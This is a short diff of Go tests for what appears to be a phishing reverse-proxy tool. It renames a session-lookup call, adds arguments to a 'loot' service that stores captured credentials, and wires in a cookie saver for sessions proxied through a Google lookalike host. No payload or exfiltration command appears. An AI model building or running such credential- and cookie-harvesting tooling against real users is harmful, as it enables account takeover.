@@ -82,7 +82,7 @@ func TestAPIMiddlewareGetCookies(t *testing.T) {
 			req.AddCookie(cookie)
 			req.Header["Origin"] = []string{"https://www-google-com.example.com"}
 
-			cookieJar := cm.Get(cookie.Value)
+			cookieJar := cm.GetSession(cookie.Value)
 			cookieJar.SetCookies(&url.URL{Scheme: "https", Host: "www.google.com"}, tt.cookies)
 
 			resp, err := app.Test(req)
@@ -142,7 +142,7 @@ func TestAPIMiddlewareCreateCookies(t *testing.T) {
 			req.AddCookie(cookie)
 			req.Header["Origin"] = []string{"https://www-google-com.example.com"}
 
-			cookieJar := cm.Get(cookie.Value)
+			cookieJar := cm.GetSession(cookie.Value)
 			cookieJar.SetCookies(&url.URL{Scheme: "https", Host: "www.google.com"}, tt.cookies)
 
 			resp, err := app.Test(req)
@@ -185,7 +185,7 @@ func TestAPIMiddlewareGetOrigin(t *testing.T) {
 func TestAPIMiddlewareSaveCreds(t *testing.T) {
 	var buff bytes.Buffer
 	lootRepo := NewFileLootRepository(&buff)
-	lootService := NewLootService(lootRepo)
+	lootService := NewLootService(lootRepo, nil, nil)
 	app := createAPIApp(t, NewCookieManager(), lootService, nil)
 	start := time.Now()
 
@@ -377,6 +377,7 @@ func createAPIApp(t *testing.T, cm CookieManager, lootService LootService,
 		AuthHandler:     auth,
 		LootService:     lootService,
 		LureService:     lureService,
+		CookieSaver:     NewCookieService(),
 	})
 	app.Use(api, auth)
 	app.All("/*", func(c *fiber.Ctx) error {
